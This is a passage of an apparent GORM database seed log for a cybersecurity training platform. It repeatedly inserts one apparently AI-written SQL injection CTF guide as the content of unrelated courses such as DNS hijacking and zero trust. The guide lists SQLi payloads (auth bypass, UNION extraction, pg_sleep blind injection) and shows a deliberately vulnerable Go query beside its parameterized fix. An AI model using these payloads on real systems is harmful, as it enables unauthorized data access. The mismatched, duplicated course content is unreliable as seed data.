* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,14) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.507ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.782ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.667','2025-06-09 14:07:53.667',NULL,'wi-fi eavesdropping','Intercepting unencrypted wireless communications',170,2) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.474ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.377ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 15 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.141ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.674','2025-06-09 14:07:53.674',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,15) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.405ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.709ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.681','2025-06-09 14:07:53.681',NULL,'network intrusion detection','Identifying malicious activity using NIDS/NIPS',230,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.548ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.634ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 16 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[16.022ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.692','2025-06-09 14:07:53.692',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,16) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.401ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.240ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.704','2025-06-09 14:07:53.704',NULL,'dns hijacking','Redirecting traffic through compromised DNS servers',210,5) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.572ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.708ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 17 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.242ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.712','2025-06-09 14:07:53.712',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,17) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.656ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[11.460ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.721','2025-06-09 14:07:53.721',NULL,'zero trust architecture','Implementing ''never trust, always verify'' principles',240,4) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.489ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.350ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 18 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[12.239ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.733','2025-06-09 14:07:53.733',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,18) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.417ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.634ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:53.745','2025-06-09 14:07:53.745',NULL,'rogue access points','Detecting and neutralizing unauthorized wireless devices',190,3) RETURNING "id"

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.431ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.439ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 19 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:53 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.560ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:53.752','2025-06-09 14:07:53.752',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
